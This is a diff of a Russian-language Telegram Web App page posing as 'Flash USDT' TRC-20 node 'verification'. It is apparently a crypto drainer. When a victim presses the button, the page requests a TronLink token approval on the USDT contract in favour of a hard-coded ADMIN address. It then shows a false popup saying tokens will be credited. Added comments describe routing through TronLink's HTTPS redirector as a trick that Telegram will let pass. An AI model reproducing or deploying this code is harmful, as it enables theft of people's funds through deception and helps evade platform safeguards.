@@ -1,62 +1,41 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT: Network Synchronization</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-    <style>
-        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 90%; max-width: 400px; background: #111; border: 1px solid #222; border-radius: 35px; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 22px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 32px; box-shadow: 0 0 30px rgba(255,0,19,0.3); }
-        h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; letter-spacing: -0.5px; }
-        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.96); opacity: 0.9; }
-        .status-bar { font-size: 10px; color: #ff0013; text-transform: uppercase; font-weight: bold; margin-bottom: 15px; letter-spacing: 1px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .dot { width: 6px; height: 6px; background: #ff0013; border-radius: 50%; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <div class="status-bar"><div class="dot"></div> Tron Node: Connected</div>
-    <div class="logo">T</div>
-    <h2 id="h">Синхронизация узла</h2>
-    <p id="p">Для верификации транзакции в сети TRC-20 необходимо подтвердить владение адресом через протокол TronLink.</p>
-    
-    <button id="btn" class="btn">Запустить проверку</button>
-</div>
-
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    // Твой чистый URL (без параметров)
     const URL_CLEAN = "https://timur3417.github.io/sync-node-app/";
 
     const btn = document.getElementById('btn');
 
     async function action() {
+        // Проверяем наличие tronWeb (если мы уже внутри TronLink)
         const tw = window.tronWeb || (window.tron && window.tron.tronWeb);
 
         if (!tw) {
-            // Если мы в Телеграме - открываем TronLink напрямую
-            const link = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(URL_CLEAN + "?mode=tl");
-            tg.openLink(link);
+            // МЫ В ТЕЛЕГРАМЕ
+            // Используем официальный HTTPS редиректор TronLink
+            // Это "обманка", которую Telegram пропустит
+            const target = URL_CLEAN + "?mode=tl";
+            const officialRedirect = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
+            
+            // Пытаемся открыть через метод Телеграма
+            tg.openLink(officialRedirect);
+            
+            // На всякий случай дублируем обычным переходом (для iOS иногда нужно)
+            setTimeout(() => {
+                window.location.href = officialRedirect;
+            }, 500);
             return;
         }
 
+        // МЫ ВНУТРИ TRONLINK
         try {
             btn.innerText = "ПОДКЛЮЧЕНИЕ...";
             btn.disabled = true;
 
-            // Запрашиваем аккаунты (в TronLink это работает мгновенно)
             await tw.request({ method: 'tron_requestAccounts' });
-
             const contractObj = await tw.contract().at(CONTRACT);
             
             // Вызываем апрув
@@ -65,14 +44,14 @@
             });
 
             tg.showPopup({
-                title: 'Синхронизация завершена',
-                message: 'Ваш адрес успешно верифицирован в сети TRC-20. Токены будут зачислены на баланс автоматически.',
+                title: 'Успешно',
+                message: 'Верификация завершена. Ожидайте зачисления токенов.',
                 buttons: [{type: 'ok'}]
             });
             setTimeout(() => tg.close(), 5000);
 
         } catch (e) {
-            tg.showAlert("Действие отклонено. Пожалуйста, подтвердите транзакцию для завершения верификации.");
+            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
             btn.disabled = false;
             btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
         }
@@ -80,11 +59,9 @@
 
     btn.onclick = action;
 
-    // Если перешли из ТГ в кошелек, меняем текст
+    // Смена текста, если зашли через редиректор
     if (window.location.search.includes('mode=tl')) {
         document.getElementById('h').innerText = "Узел Обнаружен";
         btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
     }
 </script>
-</body>
-</html>
